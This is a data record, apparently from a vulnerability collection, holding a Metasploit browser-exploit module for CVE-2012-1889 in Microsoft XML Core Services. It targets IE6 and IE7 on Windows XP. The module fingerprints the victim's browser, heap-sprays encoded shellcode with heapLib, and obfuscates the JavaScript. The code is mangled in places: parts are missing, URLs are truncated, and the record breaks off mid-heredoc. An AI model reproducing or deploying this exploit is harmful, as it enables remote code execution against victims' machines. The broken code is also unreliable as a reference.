{
    "text": "vul_name : Microsoft IE7 XML Core Services MSXML Uninitialized Memory Corruption ， vul_cve : CVE-2012-1889 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = NormalRanking ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : Remote : BrowserAutopwn ， autopwn_info ( { ，  : ua_name => HttpClients : IE ,  ，  : ua_minver => \"6.0\" ,  ，  : ua_maxver => \"7.0\" ,  ，  : javascript => true ,  ，  : os_name => OperatingSystems : WINDOWS ,  ，  : classid => \"{f6D90f11-9c73-11d3-b32e-00C04f990bb4}\" ,  ，  : method => \"definition\" ,  ，  : rank => NormalRanking ， } )  ， super ( update_info ( info ,  ， 'Name' => \"Microsoft XML Core Services MSXML Uninitialized Memory Corruption\" ,  ， 'Description' => %q{ ， This module exploits a memory corruption flaw in Microsoft XML Core Services ， when trying to access an uninitialized Node with the getDefinition API , which ， may corrupt memory allowing remote code execution. At the moment , this module ， only targets Microsoft XML Core Services 3.0 via IE6 and IE7 over Windows XP SP3. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'sinn3r' ,  # Metasploit module ， 'juan vazquez' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2012-1889' ]  ,  ，  [ 'OSVDB' , '82873' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Payload' => ， { ， 'BadChars' => \"\\x00\" ,  ， 'Space' => 1024 ， } ,  ， 'DefaultOptions' => ， { ， 'ExitFunction' => \"none\" ,  ， 'InitialAutoRunScript' => 'migrate -f' ， } ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  # msxml3.dll 8.90.1101.0 ，  [ 'Automatic' , {} ]  ,  ，  [ 'IE 6 on Windows XP SP3' , { 'Offset' => '0x800 - code.length' } ]  ,  ，  [ 'IE 7 on Windows XP SP3' , { 'Offset' => '0x800 - code.length' } ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Jun 12 2012\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptBool.new ( 'OBFUSCATE' ,  [ false , 'Enable JavaScript obfuscation' , false ]  )  ，  ]  , self.class )  ， end ，  # If the user is already specified by the user , we'll just use that ， elsif agent = ~ /NT 5\\.1/ and agent = ~ /MSIE 7/ ， end ， end ， agent = request.headers [ 'User-Agent' ]  ， my_target = get_target ( agent )  ，  # Avoid the attack if the victim doesn't have the same setup we're targeting ， print_error ( \" # {cli.peerhost} :  # {cli.peerport} - Browser not supported :  # {agent.to_s}\" )  ， send_not_found ( cli )  ， end ，  # Set payload depending on target ， p = payload.encoded ， js_code = Rex : Text.to_unescape ( p , Rex : Arch.endian ( target.arch )  ， js_nops = Rex : Text.to_unescape ( \"\\x0c\" * 4 , Rex : Arch.endian ( target.arch )  ， js = -JS ， var heap_obj = new heapLib.ie ( 0x20000 )  ;  ， var code = unescape ( \" # {js_code}\" )  ;  ， var nops = unescape ( \" # {js_nops}\" )  ;  ， var offset = nops.substring ( 0 ,  # {my_target [ 'Offset' ] } )  ;  ， var shellcode = offset + code + nops.substring ( 0 , 0x800-code.length-offset.length )  ;  ， var block = shellcode.substring ( 0 ,  ( 0x80000-6 ) /2 )  ;  ， heap_obj.gc (  )  ;  ， heap_obj.alloc ( block )  ;  ， } ， JS ， js = heaplib ( js , { : noobfu => true} )  ， js = : Rex : Exploitation : JSObfu.new ( js )  ， js.obfuscate ， end ， object_id = rand_text_alpha ( 4 )  ， html = -EOS",
    "time": "2012.06.17"
}